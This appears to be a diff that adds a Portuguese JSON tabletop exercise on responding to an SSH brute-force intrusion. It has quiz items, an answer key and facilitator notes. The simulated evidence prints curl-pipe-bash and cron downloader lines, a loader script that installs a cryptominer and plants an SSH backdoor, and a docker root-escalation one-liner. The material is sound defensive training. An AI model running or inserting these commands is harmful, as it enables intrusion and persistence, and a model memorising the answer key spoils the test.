@@ -1,0 +1,582 @@
+{
+	"id": "ssh-brute-force-server",
+	"title": "Resposta a Ataque de Força Bruta SSH em Servidor Interno",
+	"description": "Simulação tabletop de resposta a detecção de ataque de força bruta SSH massivo contra servidor Linux interno com evidências de comprometimento parcial",
+	"category": {
+		"id": "SEC_SYS",
+		"type": "SEC_SYS_SSH_BRUTE_FORCE",
+		"title": "Ataque de Força Bruta SSH"
+	},
+	"metadata": {
+		"version": "1.0",
+		"lastUpdate": "2025-02-17",
+		"author": "Lucas Rayan Guerra",
+		"estimatedDuration": "35-50 minutos",
+		"difficulty": "Intermediário",
+		"targetAudience": "Equipe de Resposta a Incidentes, Administradores de Sistemas Linux, Analistas de Segurança, Engenheiros de Rede"
+	},
+	"objectives": [
+		"Validar capacidade de identificação de padrões de ataque de força bruta SSH em logs de autenticação",
+		"Avaliar conhecimento de técnicas de hardening SSH e mitigação de ataques de credenciais",
+		"Testar compreensão de logs de autenticação Linux (auth.log, journalctl) e indicadores de comprometimento",
+		"Desenvolver habilidade de análise de movimentação lateral pós-comprometimento",
+		"Identificar controles preventivos de acesso (fail2ban, chaves SSH, MFA, bastion hosts)",
+		"Promover compreensão de gerenciamento seguro de acessos privilegiados"
+	],
+	"scope": [
+		"Exercício de simulação tabletop - não haverá execução real de comandos em sistemas de produção",
+		"Não inclui teste de penetração real ou tentativas de exploração ativas",
+		"Foco na análise de logs de autenticação, resposta a incidentes e hardening de servidores",
+		"Avaliação de conhecimento de segurança de sistemas Linux e gerenciamento de acessos"
+	],
+	"baseScenario": {
+		"context": "Sexta-feira, 03h15 da madrugada. O sistema de monitoramento (Zabbix) envia alerta por email e SMS para a equipe de plantão. Um servidor de aplicação Linux (app-server-01.internal.corp) está apresentando carga elevada de CPU e grande volume de logs de autenticação. A organização possui 40 servidores Linux acessíveis via SSH a partir de uma rede de gerência dedicada (10.10.100.0/24). O servidor afetado acidentalmente teve a porta SSH (22) exposta à internet após uma mudança de firewall realizada na quinta-feira à tarde.",
+		"initialSituation": {
+			"alert": "Zabbix Alert: CRITICAL - app-server-01 - CPU >90% - auth.log growing rapidly (>500MB/hour)",
+			"affectedHost": "app-server-01.internal.corp (10.10.20.30, público: 203.0.113.45)",
+			"sshExposure": "Porta 22 acessível da internet desde quinta-feira 17:30 (mudança de firewall)",
+			"authFailures": "~45.000 tentativas de autenticação falhas nas últimas 10 horas",
+			"timestamp": "03:15:22"
+		},
+		"initialComplaints": [
+			"Alerta automático de CPU >90% no servidor app-server-01",
+			"Log auth.log crescendo a 500MB/hora (normal: <1MB/hora)",
+			"Aplicação hospedada no servidor apresentando lentidão",
+			"Nenhuma mudança planejada para o servidor nesta madrugada"
+		],
+		"availableResources": [
+			"Acesso SSH ao servidor via rede de gerência (10.10.100.0/24)",
+			"Logs de autenticação: /var/log/auth.log e journalctl -u sshd",
+			"Firewall de borda (iptables/nftables) com logs de conexões",
+			"Sistema de monitoramento (Zabbix) com histórico de métricas",
+			"Active Directory / LDAP para gerenciamento centralizado de contas",
+			"Ferramenta de análise de logs (ELK Stack - Elasticsearch, Logstash, Kibana)",
+			"Documentação de mudanças recentes no firewall (change management)",
+			"Lista de contas de serviço e acesso SSH autorizado por servidor"
+		]
+	},
+	"rounds": [
+		{
+			"id": 1,
+			"title": "Preparação e Contextualização",
+			"phase": "Preparação",
+			"description": "Apresentação do cenário base. A equipe de plantão deve avaliar a situação e decidir como proceder na madrugada.",
+			"inject": "São 03h15 de sexta-feira. O engenheiro de plantão recebeu alerta automático e, ao verificar o Zabbix, observou CPU acima de 90% no app-server-01. Ao acessar o servidor, notou que o auth.log era o fileque mais crescia. A equipe tem 5 minutos para avaliar a situação e definir ações imediatas.",
+			"questions": []
+		},
+		{
+			"id": 2,
+			"title": "Detecção e Análise Inicial",
+			"phase": "Fase 1 - Detecção e Análise",
+			"description": "A equipe acessa o servidor comprometido via rede de gerência e analisa os logs de autenticação SSH.",
+			"timeElapsed": "T+0 (início da investigação)",
+			"currentSituation": {
+				"attackStatus": "Em andamento - tentativas de login SSH continuam",
+				"authFailures": "~45.000 falhas nas últimas 10 horas (~75/minuto)",
+				"cpuUsage": "92% (sshd consuming excessive resources)",
+				"impact": "Servidor lento, aplicação com timeout, risco de acesso não autorizado"
+			},
+			"metrics": [
+				{
+					"title": "Análise de Logs de Autenticação (auth.log)",
+					"type": "auth-log-analysis",
+					"data": {
+						"command": "grep 'Failed password' /var/log/auth.log | wc -l",
+						"totalFailedAttempts": 45237,
+						"timespan": "Últimas 10 horas (desde 17:30 de ontem)",
+						"ratePerMinute": 75,
+						"sampleEntries": [
+							"Feb 16 17:34:12 app-server-01 sshd[18234]: Failed password for root from 91.134.201.45 port 48231 ssh2",
+							"Feb 16 17:34:13 app-server-01 sshd[18235]: Failed password for admin from 91.134.201.45 port 48232 ssh2",
+							"Feb 16 17:34:14 app-server-01 sshd[18236]: Failed password for invalid user test from 185.220.101.12 port 52841 ssh2",
+							"Feb 16 17:34:15 app-server-01 sshd[18237]: Failed password for invalid user oracle from 45.155.205.87 port 39215 ssh2",
+							"Feb 17 02:47:33 app-server-01 sshd[24891]: Accepted password for deploy from 91.134.201.45 port 61234 ssh2"
+						],
+						"observation": "ATENÇÃO: Última entrada mostra login ACEITO para usuário 'deploy' do IP atacante 91.134.201.45 às 02:47"
+					}
+				},
+				{
+					"title": "Distribuição de IPs Atacantes",
+					"type": "ip-analysis",
+					"data": {
+						"totalUniqueIPs": 328,
+						"topAttackers": [
+							{"ip": "91.134.201.45", "attempts": 12847, "country": "França", "status": "LOGIN ACEITO às 02:47"},
+							{"ip": "185.220.101.12", "attempts": 8934, "country": "Alemanha", "status": "Apenas falhas"},
+							{"ip": "45.155.205.87", "attempts": 6421, "country": "Rússia", "status": "Apenas falhas"},
+							{"ip": "194.26.29.103", "attempts": 4218, "country": "Países Baixos", "status": "Apenas falhas"},
+							{"ip": "103.214.69.44", "attempts": 3102, "country": "Vietnã", "status": "Apenas falhas"}
+						],
+						"observation": "328 IPs distribuídos (botnet). IP 91.134.201.45 conseguiu login bem-sucedido após ~12.800 tentativas"
+					}
+				},
+				{
+					"title": "Análise de Usernames Tentados",
+					"type": "username-analysis",
+					"data": {
+						"command": "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn | head",
+						"topUsernames": [
+							{"username": "root", "attempts": 18934, "exists": true},
+							{"username": "admin", "attempts": 8421, "exists": false},
+							{"username": "deploy", "attempts": 5847, "exists": true, "note": "LOGIN ACEITO"},
+							{"username": "test", "attempts": 3218, "exists": false},
+							{"username": "oracle", "attempts": 2104, "exists": false},
+							{"username": "postgres", "attempts": 1876, "exists": false},
+							{"username": "ubuntu", "attempts": 1543, "exists": true},
+							{"username": "git", "attempts": 1211, "exists": false}
+						],
+						"observation": "Atacante testou usernames comuns (dicionário). Usuário 'deploy' tinha senha fraca e foi comprometido"
+					}
+				},
+				{
+					"title": "Atividade Pós-Comprometimento do Usuário 'deploy'",
+					"type": "post-compromise-analysis",
+					"data": {
+						"loginTime": "02:47:33",
+						"loginSource": "91.134.201.45",
+						"commandHistory": [
+							"whoami",
+							"id",
+							"uname -a",
+							"cat /etc/passwd",
+							"sudo -l",
+							"curl -s http://185.234.72.100/loader.sh | bash",
+							"crontab -e"
+						],
+						"sudoAccess": "deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl, /usr/bin/docker",
+						"cronJobAdded": "*/5 * * * * curl -s http://185.234.72.100/check.sh | bash",
+						"observation": "Atacante obteve acesso, executou reconhecimento, baixou script malicioso e estabeleceu persistência via crontab"
+					}
+				},
+				{
+					"title": "Configuração SSH do Servidor",
+					"type": "ssh-config-analysis",
+					"data": {
+						"permitRootLogin": "yes",
+						"passwordAuthentication": "yes",
+						"pubkeyAuthentication": "yes",
+						"maxAuthTries": 6,
+						"loginGraceTime": "120 seconds",
+						"fail2ban": "NÃO instalado",
+						"allowedUsers": "Não configurado (qualquer usuário pode tentar login)",
+						"port": 22,
+						"observation": "Configuração SSH extremamente permissiva: root login habilitado, senha habilitada, sem fail2ban, sem restrição de usuários"
+					}
+				}
+			],
+			"questions": [
+				{
+					"id": "q1",
+					"type": "multiple-choice",
+					"text": "A análise dos logs revela login ACEITO do usuário 'deploy' do IP atacante 91.134.201.45 após ~12.800 tentativas. Qual é a classificação CORRETA deste incidente?",
+					"options": [
+						"Tentativa de intrusão (apenas tentativas de brute force sem sucesso)",
+						"Intrusão confirmada - comprometimento de credencial + acesso não autorizado com atividade pós-exploração",
+						"Falso positivo - pode ser acesso legítimo de administrador remoto",
+						"Ataque DDoS contra o serviço SSH do servidor"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Intrusão confirmada (B): evidências convergentes de comprometimento: (1) login aceito de IP atacante após milhares de tentativas, (2) atividade pós-comprometimento (whoami, uname, cat /etc/passwd = reconhecimento), (3) download de script malicioso (curl | bash), (4) persistência via crontab. Não é apenas tentativa (A) porque houve login bem-sucedido. Não é falso positivo (C) porque IP atacante + padrão de brute force + atividade maliciosa. Não é DDoS (D) embora cause impacto de performance."
+				},
+				{
+					"id": "q2",
+					"type": "multiple-choice",
+					"text": "O atacante executou 'curl -s http://185.234.72.100/loader.sh | bash'. Qual é a primeira ação de contenção MAIS URGENTE?",
+					"options": [
+						"Analisar o conteúdo do script loader.sh antes de tomar qualquer ação",
+						"Bloquear o IP 185.234.72.100 no firewall E remover o crontab malicioso para impedir reinfecção",
+						"Reiniciar o servidor para limpar processos maliciosos",
+						"Mudar a senha do usuário deploy e continuar monitorando"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Bloquear IP + remover crontab (B) é a ação mais urgente porque: (1) bloquear 185.234.72.100 corta comunicação com infraestrutura do atacante imediatamente, (2) remover crontab impede que o script malicioso seja baixado/executado a cada 5 minutos. Analisar primeiro (A) perde tempo enquanto o script continua executando. Reiniciar (C) pode destruir evidências voláteis e não remove persistência (crontab sobrevive reboot). Mudar senha (D) não contém o malware já instalado."
+				},
+				{
+					"id": "q3",
+					"type": "true-false",
+					"text": "Verdadeiro ou Falso: O fato da porta SSH estar exposta à internet é, por si só, uma vulnerabilidade de segurança, mesmo que todos os usuários usem senhas fortes de 20+ caracteres.",
+					"correctAnswer": true,
+					"points": 3,
+					"justification": "VERDADEIRO. SSH exposto à internet é um risco de segurança independente da força das senhas porque: (1) aumenta a superfície de ataque desnecessariamente, (2) consome recursos do servidor processando tentativas de brute force, (3) expõe a possíveis vulnerabilidades zero-day no OpenSSH, (4) permite enumeração de usuários em algumas versões, (5) senhas 'fortes' dos usuários podem ser comprometidas por outros meios (phishing, reuse). Melhor prática: SSH acessível apenas via VPN ou bastion host, com autenticação por chave."
+				},
+				{
+					"id": "q4",
+					"type": "matching",
+					"text": "Correlacione cada configuração SSH insegura encontrada com o risco que ela introduz:",
+					"leftColumn": [
+						{"id": "config1", "label": "PermitRootLogin yes"},
+						{"id": "config2", "label": "PasswordAuthentication yes"},
+						{"id": "config3", "label": "Fail2ban não instalado"},
+						{"id": "config4", "label": "AllowUsers não configurado"}
+					],
+					"rightColumn": [
+						{"id": "risk1", "label": "Permite tentativas ilimitadas de login sem bloqueio temporal"},
+						{"id": "risk2", "label": "Permite brute force de senhas (vs. chaves SSH mais seguras)"},
+						{"id": "risk3", "label": "Acesso root direto = máximo privilégio se senha for descoberta"},
+						{"id": "risk4", "label": "Qualquer conta do sistema pode ser alvo de brute force SSH"}
+					],
+					"correctMatches": [
+						{"left": "config1", "right": "risk3"},
+						{"left": "config2", "right": "risk2"},
+						{"left": "config3", "right": "risk1"},
+						{"left": "config4", "right": "risk4"}
+					],
+					"partialCredit": true,
+					"pointsPerMatch": 2,
+					"points": 8,
+					"justification": "PermitRootLogin yes (config1) → risco de acesso root direto (risk3): se root for brute-forced, atacante tem controle total. PasswordAuthentication yes (config2) → permite brute force de senhas (risk2): chaves SSH eliminam este vetor. Sem fail2ban (config3) → tentativas ilimitadas (risk1): fail2ban bloqueia IP após N falhas. Sem AllowUsers (config4) → qualquer conta é alvo (risk4): restringir a usuários específicos reduz superfície."
+				}
+			]
+		},
+		{
+			"id": 3,
+			"title": "Contenção e Investigação",
+			"phase": "Fase 2 - Contenção",
+			"description": "IP atacante bloqueado, crontab malicioso removido, porta SSH fechada no firewall externo. A equipe investiga o escopo do comprometimento.",
+			"timeElapsed": "T+20 minutos",
+			"currentSituation": {
+				"attackSSH": "Bloqueado - porta 22 fechada no firewall externo",
+				"maliciousCrontab": "Removido",
+				"compromisedAccount": "deploy - senha trocada, sessões encerradas",
+				"malwareStatus": "Script loader.sh baixado - análise em andamento",
+				"impact": "Servidor comprometido por ~30 minutos (02:47 a 03:20)"
+			},
+			"metrics": [
+				{
+					"title": "Análise do Script Malicioso (loader.sh)",
+					"type": "malware-analysis",
+					"data": {
+						"filename": "loader.sh",
+						"content_summary": [
+							"#!/bin/bash",
+							"# Download e execução de cryptominer XMRig",
+							"wget -q http://185.234.72.100/xmrig -O /tmp/.cache/xmrig",
+							"chmod +x /tmp/.cache/xmrig",
+							"nohup /tmp/.cache/xmrig -o pool.minexmr.com:443 -u 48edfH...wallet... -p x --threads=$(nproc) &",
+							"# Adiciona chave SSH do atacante",
+							"echo 'ssh-rsa AAAA...atacante...' >> /home/deploy/.ssh/authorized_keys",
+							"# Varredura de rede interna",
+							"for ip in $(seq 1 254); do timeout 1 bash -c 'echo > /dev/tcp/10.10.20.$ip/22' 2>/dev/null && echo \"10.10.20.$ip:22 open\"; done"
+						],
+						"malwareType": "Cryptominer (XMRig - Monero) + Backdoor SSH + Scanner de rede",
+						"observation": "Tríade de ataque: (1) cryptominer para lucro, (2) backdoor SSH para acesso persistente, (3) scanner para movimentação lateral"
+					}
+				},
+				{
+					"title": "Resultado da Varredura Interna do Atacante",
+					"type": "lateral-movement-analysis",
+					"data": {
+						"scanResults": [
+							{"ip": "10.10.20.31", "port": 22, "hostname": "app-server-02", "status": "SSH aberto - sem tentativa de login detectada"},
+							{"ip": "10.10.20.32", "port": 22, "hostname": "db-server-01", "status": "SSH aberto - sem tentativa de login detectada"},
+							{"ip": "10.10.20.35", "port": 22, "hostname": "monitoring-server", "status": "SSH aberto - sem tentativa de login detectada"}
+						],
+						"sshKeyPropagation": "Chave SSH do atacante adicionada APENAS em /home/deploy/.ssh/authorized_keys no app-server-01",
+						"internalBruteForce": "Nenhuma tentativa de login em outros servidores detectada nos logs",
+						"observation": "A varredura identificou outros servidores SSH mas o atacante não teve tempo de tentar movimentação lateral antes da contenção"
+					}
+				},
+				{
+					"title": "Processos Maliciosos Encontrados",
+					"type": "process-analysis",
+					"data": {
+						"processes": [
+							{
+								"name": "xmrig",
+								"pid": 25134,
+								"user": "deploy",
+								"cpu": "87%",
+								"memory": "2.1%",
+								"startTime": "02:48:12",
+								"path": "/tmp/.cache/xmrig",
+								"connections": "pool.minexmr.com:443 (ESTABLISHED)"
+							}
+						],
+						"cryptominerRunTime": "~27 minutos antes da detecção/contenção",
+						"observation": "Cryptominer XMRig consumindo 87% de CPU - causa direta do alerta de CPU do Zabbix"
+					}
+				}
+			],
+			"questions": [
+				{
+					"id": "q5",
+					"type": "multiple-choice",
+					"text": "O script malicioso adicionou uma chave SSH pública do atacante em authorized_keys. Por que isso é MAIS perigoso que a senha que já foi trocada?",
+					"options": [
+						"Chaves SSH são mais rápidas para login que senhas",
+						"A chave SSH permite acesso mesmo após troca de senha, bypass de autenticação por senha completamente",
+						"Chaves SSH não podem ser revogadas",
+						"Chaves SSH são visíveis nos logs de autenticação"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "A chave SSH (B) é um mecanismo de PERSISTÊNCIA que bypassa autenticação por senha. Mesmo após trocar a senha do deploy, o atacante ainda pode acessar via chave SSH sem fornecer senha. Por isso é CRÍTICO verificar e limpar authorized_keys após comprometimento. Chaves CAN ser revogadas (C é falso) removendo-as do authorized_keys. Velocidade (A) não é o risco principal. Chaves SSH SÃO logadas (D é falso) mas com formato diferente ('Accepted publickey')."
+				},
+				{
+					"id": "q6",
+					"type": "multiple-choice",
+					"text": "O atacante usou o comando 'sudo -l' para verificar permissões sudo. O usuário 'deploy' tem: 'deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl, /usr/bin/docker'. Qual é o risco MAIS CRÍTICO dessa configuração?",
+					"options": [
+						"systemctl pode reiniciar serviços causando indisponibilidade",
+						"docker com NOPASSWD permite escalação para root: 'sudo docker run -v /:/host -it alpine chroot /host'",
+						"O atacante pode instalar pacotes via systemctl",
+						"NOPASSWD permite sudo sem limite de tempo"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Docker com sudo NOPASSWD (B) é escalação trivial para root. O comando 'sudo docker run -v /:/host -it alpine chroot /host' monta o filesystem root (/) dentro do container e executa chroot, dando shell root completo no host. Docker por design requer privilégios elevados - conceder sudo docker sem restrições é equivalente a dar acesso root. systemctl (A) pode causar DoS mas não dá root. Docker não instala pacotes via systemctl (C). NOPASSWD (D) é sobre conveniência, não tempo."
+				},
+				{
+					"id": "q7",
+					"type": "ordering",
+					"text": "Ordene corretamente as ações de erradicação para limpar o servidor comprometido:",
+					"items": [
+						{"id": "step1", "label": "Terminar processo xmrig e remover binário de /tmp/.cache/"},
+						{"id": "step2", "label": "Remover chave SSH do atacante de authorized_keys"},
+						{"id": "step3", "label": "Remover crontab malicioso do usuário deploy"},
+						{"id": "step4", "label": "Verificar se o atacante criou outros usuarios ou modificou arquivos de sistema"}
+					],
+					"correctOrder": ["step3", "step1", "step2", "step4"],
+					"partialCredit": false,
+					"points": 5,
+					"justification": "Ordem: (1) Remover crontab PRIMEIRO - impede que o mecanismo de persistência reinstale o malware a cada 5 minutos se alguma etapa demorar. (2) Terminar xmrig - interrompe mineração e libera CPU. (3) Remover chave SSH - elimina backdoor de acesso. (4) Verificação ampla - APÓS remover mecanismos de reinfecção, fazer auditoria completa buscando outras modificações do atacante (novos usuários, sudoers, SUID bits, modificações em .bashrc, etc.)."
+				},
+				{
+					"id": "q8",
+					"type": "true-false",
+					"text": "Verdadeiro ou Falso: Após a contenção e erradicação dos artefatos maliciosos conhecidos, o servidor pode ser considerado seguro para retorno à produção sem necessidade de reimaging.",
+					"correctAnswer": false,
+					"points": 3,
+					"justification": "FALSO. Após comprometimento com execução de código remoto (curl | bash como deploy com sudo docker), NÃO é possível garantir integridade do sistema. O atacante pode ter: (1) instalado rootkits que sobrevivem a limpeza superficial, (2) modificado binários do sistema (trojanized sshd, bash), (3) criado backdoors em locais não verificados, (4) escalado para root via Docker e modificado o kernel. A recomendação é reimaging completo: reinstalar SO, restaurar apenas dados/configurações de backup confiável. A limpeza manual é insuficiente para garantir erradicação completa."
+				}
+			]
+		},
+		{
+			"id": 4,
+			"title": "Análise de Causa Raiz e Hardening",
+			"phase": "Fase 3 - Erradicação e Hardening",
+			"description": "A equipe investiga como a porta SSH foi exposta e implementa medidas de hardening para todos os servidores.",
+			"timeElapsed": "T+2 horas",
+			"currentSituation": {
+				"serverStatus": "Desligado para reimaging",
+				"rootCauseIdentified": "Mudança de firewall não revisada expôs porta SSH",
+				"otherServers": "Auditoria de exposição SSH em andamento para todos os 40 servidores",
+				"impact": "app-server-01 offline para reconstrução, aplicação migrada para servidor backup"
+			},
+			"metrics": [
+				{
+					"title": "Análise da Mudança de Firewall (Causa Raiz)",
+					"type": "change-analysis",
+					"data": {
+						"changeID": "CHG-2025-0247",
+						"changeDate": "2025-02-16 17:30",
+						"requestedBy": "Equipe de Desenvolvimento",
+						"approvedBy": "Líder de TI (aprovação verbal, sem registro formal)",
+						"changeDescription": "Liberar porta 8080 do app-server-01 para testes de API externa",
+						"actualChange": "Regra adicionada liberou TODAS as portas do IP 203.0.113.45 (any:any) em vez de apenas 8080",
+						"reviewProcess": "Nenhuma revisão pós-mudança realizada",
+						"rollbackPlan": "Não documentado",
+						"observation": "Regra de firewall ampla demais (any:any) expôs SSH e todos os serviços. Falha no processo de change management"
+					}
+				},
+				{
+					"title": "Auditoria de Exposição SSH - Todos os Servidores",
+					"type": "exposure-audit",
+					"data": {
+						"totalServers": 40,
+						"sshExposedInternet": 1,
+						"sshInternalOnly": 39,
+						"passwordAuthEnabled": 28,
+						"keyOnlyAuth": 12,
+						"fail2banInstalled": 5,
+						"rootLoginEnabled": 31,
+						"mfaEnabled": 0,
+						"observation": "Postura de segurança SSH fraca: 70% com autenticação por senha, 78% com root login, 88% sem fail2ban, 0% com MFA"
+					}
+				}
+			],
+			"questions": [
+				{
+					"id": "q9",
+					"type": "multiple-choice",
+					"text": "A regra de firewall liberou 'any:any' em vez de apenas a porta 8080. Qual falha de processo permitiu isso?",
+					"options": [
+						"Falta de automação na configuração do firewall",
+						"Ausência de revisão obrigatória (four-eyes principle) e validação pós-mudança em processo de change management",
+						"O líder de TI não entende tecnicamente regras de firewall",
+						"A equipe de desenvolvimento não deveria ter acesso ao firewall"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Ausência de revisão obrigatória e validação pós-mudança (B) é a falha de processo central. O four-eyes principle (duas pessoas revisam mudanças críticas) teria identificado a regra ampla. Validação pós-mudança (verificar portas expostas com nmap após aplicar regra) teria detectado a exposição. Automação (A) é desejável mas não substitui revisão. Competência técnica (C) e controle de acesso (D) são fatores contribuintes, não causa raiz do processo."
+				},
+				{
+					"id": "q10",
+					"type": "multiple-choice",
+					"text": "A auditoria revelou que 28 dos 40 servidores usam autenticação SSH por senha. Qual abordagem de hardening é MAIS eficaz para toda a infraestrutura?",
+					"options": [
+						"Instalar fail2ban em todos os servidores com limite de 3 tentativas",
+						"Desabilitar PasswordAuthentication e usar exclusivamente chaves SSH + implementar bastion host (jump server)",
+						"Mudar porta SSH padrão de 22 para porta alta (ex: 2222) em todos os servidores",
+						"Implementar senhas complexas com mínimo de 16 caracteres e rotação mensal"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Chaves SSH + bastion host (B) é a solução mais robusta: chaves eliminam completamente o vetor de brute force de senhas (chave RSA 4096 é ordens de magnitude mais segura), e bastion host centraliza acesso SSH em um único ponto robusto (reduz superfície de ataque de 40 para 1 servidor exposto). Fail2ban (A) mitiga mas não elimina o risco. Mudar porta (C) é security through obscurity - encontrada trivialmente com scan. Senhas complexas (D) são melhores mas ainda vulneráveis a credential stuffing e phishing."
+				},
+				{
+					"id": "q11",
+					"type": "numeric",
+					"text": "O atacante tentou ~12.800 senhas para o usuário 'deploy' antes de obter sucesso. Se fail2ban estivesse configurado para banir IPs após 5 tentativas falhas por 1 hora, quantas tentativas o atacante teria conseguido fazer em 10 horas (assumindo troca de IP a cada ban)?",
+					"correctAnswer": 50,
+					"tolerance": 5,
+					"unit": "tentativas por IP",
+					"points": 5,
+					"justification": "Com fail2ban: 5 tentativas falhas → ban por 1 hora. Em 10 horas, do MESMO IP: 5 tentativas (ban) + 5 (após 1h, novo ban) + ... = 10 ciclos × 5 = 50 tentativas máximo por IP. Na prática, atacantes sofisticados rodam de IPs, mas fail2ban forçaria rotação constante e reduziria drasticamente o volume. Com 328 IPs, o atacante conseguiria no máximo 328 × 5 = 1.640 tentativas antes de esgotar IPs por 1 hora, vs. as 45.237 sem fail2ban - redução de 96%."
+				}
+			]
+		},
+		{
+			"id": 5,
+			"title": "Recuperação e Lições Aprendidas",
+			"phase": "Fase 4 - Recuperação e Pós-Incidente",
+			"description": "Servidor reconstruído, hardening aplicado, processo de change management revisado. A equipe documenta lições aprendidas.",
+			"timeElapsed": "T+8 horas (servidor reconstruído e em produção)",
+			"currentSituation": {
+				"serverStatus": "Online - SO reinstalado, aplicação restaurada, hardening SSH aplicado",
+				"sshHardening": "Chaves SSH apenas, fail2ban, AllowUsers, PermitRootLogin no",
+				"firewallCorrected": "Regra corrigida para apenas porta 8080, SSH interno apenas",
+				"impact": "Nenhum - operação normalizada com postura de segurança melhorada"
+			},
+			"questions": [
+				{
+					"id": "q12",
+					"type": "multiple-choice",
+					"text": "Qual arquivo de configuração SSH deve conter as diretivas de hardening (PermitRootLogin, PasswordAuthentication, AllowUsers)?",
+					"options": [
+						"/etc/ssh/ssh_config (configuração do cliente SSH)",
+						"/etc/ssh/sshd_config (configuração do servidor SSH)",
+						"/etc/pam.d/sshd (módulo PAM de autenticação)",
+						"/etc/security/access.conf (controle de acesso Linux)"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "sshd_config (B) é o arquivo de configuração do servidor (daemon) SSH. ssh_config (A) configura o CLIENTE SSH (quando você conecta para fora). PAM (C) lida com módulos de autenticação mas as diretivas PermitRootLogin e AllowUsers são específicas do sshd. access.conf (D) é controle de acesso genérico do Linux (login, su), não específico do SSH."
+				},
+				{
+					"id": "q13",
+					"type": "multiple-choice",
+					"text": "O cryptominer XMRig estava minerando Monero. Por que atacantes preferem Monero (XMR) em vez de Bitcoin (BTC) para cryptojacking?",
+					"options": [
+						"Monero é mais valioso que Bitcoin",
+						"Monero pode ser minerado eficientemente em CPUs comuns e suas transações são privadas (não rastreáveis)",
+						"Monero não requer conexão com pool de mineração",
+						"Bitcoin não pode ser minerado em servidores Linux"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Monero (B) é preferido por duas razões: (1) seu algoritmo RandomX é otimizado para CPUs (não requer GPUs/ASICs como Bitcoin), tornando servidores comprometidos rentáveis para mineração, e (2) Monero tem privacidade nativa (ring signatures, stealth addresses) que torna transações não rastreáveis, impedindo que autoridades sigam o dinheiro até o atacante. Bitcoin é minerado eficientemente apenas com ASICs (D é parcialmente falso - pode rodar mas é ineficiente). Monero não é mais valioso que BTC (A é falso)."
+				},
+				{
+					"id": "q14",
+					"type": "multiple-choice",
+					"text": "Para detectar futuros ataques de brute force SSH mais rapidamente, qual monitoramento é MAIS eficaz?",
+					"options": [
+						"Monitorar tamanho do arquivo /var/log/auth.log",
+						"Alertar no SIEM quando taxa de 'Failed password' exceder threshold (ex: >20/minuto por IP)",
+						"Verificar semanalmente os logs de autenticação manualmente",
+						"Monitorar apenas tentativas de login do usuário root"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "Alerta no SIEM por threshold de falhas (B) é a detecção mais eficaz: configura detecção automática e em tempo real basada em regra quantitativa. O SIEM pode correlacionar múltiplos indicadores (falhas de auth + novo IP de origem + horário atípico) para reduzir falsos positivos. Tamanho do arquivo (A) é indicador indireto e tardio. Verificação semanal (C) é proativa mas infrequente demais. Monitorar apenas root (D) perderia ataques contra outras contas (como deploy neste caso)."
+				},
+				{
+					"id": "q15",
+					"type": "multiple-choice",
+					"text": "No post-mortem, qual recomendação tem MAIOR impacto na prevenção de incidentes similares?",
+					"options": [
+						"Demitir o responsável pela mudança de firewall incorreta",
+						"Implementar Infrastructure as Code (IaC) com revisão versionada de regras de firewall + scan automatizado de exposição pós-mudança",
+						"Proibir qualquer mudança de firewall fora do horário comercial",
+						"Adicionar mais servidores de monitoramento à infraestrutura"
+					],
+					"correctAnswer": 1,
+					"points": 5,
+					"justification": "IaC + scan automatizado (B) resolve a causa raiz sistematicamente: (1) IaC (Terraform, Ansible) versiona regras de firewall em Git com code review obrigatório, (2) scan automatizado (nmap, Shodan) após cada mudança detecta exposições acidentais antes que atacantes as encontrem. Demitir (A) é contraproducente. Proibir mudanças fora de horário (C) não corrige a qualidade da mudança. Mais monitoramento (D) detecta mais rápido mas não previne a exposição."
+				}
+			]
+		}
+	],
+	"evaluation": {
+		"totalPoints": 89,
+		"passingScore": 60,
+		"gradingScale": [
+			{
+				"min": 90,
+				"max": 100,
+				"grade": "Excelente",
+				"description": "Domínio completo de detecção e resposta a ataques SSH, hardening de sistemas Linux e gestão de acessos"
+			},
+			{
+				"min": 75,
+				"max": 89,
+				"grade": "Bom",
+				"description": "Compreensão sólida de segurança SSH e resposta a intrusões com pequenas lacunas em hardening avançado"
+			},
+			{
+				"min": 60,
+				"max": 74,
+				"grade": "Satisfatório",
+				"description": "Compreensão básica suficiente, requer aprofundamento em análise forense e hardening de SSH"
+			},
+			{
+				"min": 45,
+				"max": 59,
+				"grade": "Insatisfatório",
+				"description": "Lacunas significativas em segurança de sistemas Linux e resposta a incidentes de acesso"
+			},
+			{
+				"min": 0,
+				"max": 44,
+				"grade": "Inadequado",
+				"description": "Compreensão insuficiente, requer treinamento completo em administração segura de sistemas Linux"
+			}
+		]
+	},
+	"facilitatorNotes": [
+		"Enfatizar o aspecto de 'madrugada' - decisões sob pressão e cansaço são mais propensas a erros",
+		"Apresentar os logs de autenticação progressivamente, deixando a linha de 'Accepted password' como revelação dramática",
+		"Permitir 3-4 minutos de discussão entre participantes antes de cada resposta",
+		"Fazer perguntas socráticas: 'O que fail2ban teria impedido?', 'Por que chaves SSH são melhores que senhas?'",
+		"Discutir o conceito de 'blast radius' - como uma regra de firewall incorreta expandiu a superfície de ataque",
+		"Explorar o tema de change management e four-eyes principle para mudanças de infraestrutura",
+		"Controlar tempo: Rodada 1 (5 min), Rodadas 2-3 (10-12 min cada), Rodada 4 (8-10 min), Rodada 5 (7 min)",
+		"Destacar que o alerta de CPU (Zabbix) foi o que detectou o incidente indiretamente - importância de monitoramento básico",
+		"Após exercício: demonstrar hardening SSH mínimo (sshd_config), configuração de fail2ban e uso de chaves SSH"
+	],
+	"technicalReferences": [
+		{
+			"title": "OpenSSH Security Best Practices",
+			"url": "https://www.openssh.com/security.html"
+		},
+		{
+			"title": "CIS Benchmark - SSH Server Configuration",
+			"url": "https://www.cisecurity.org/benchmark/distribution_independent_linux"
+		},
+		{
+			"title": "NIST SP 800-61r2 - Computer Security Incident Handling Guide",
+			"url": "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf"
+		},
+		{
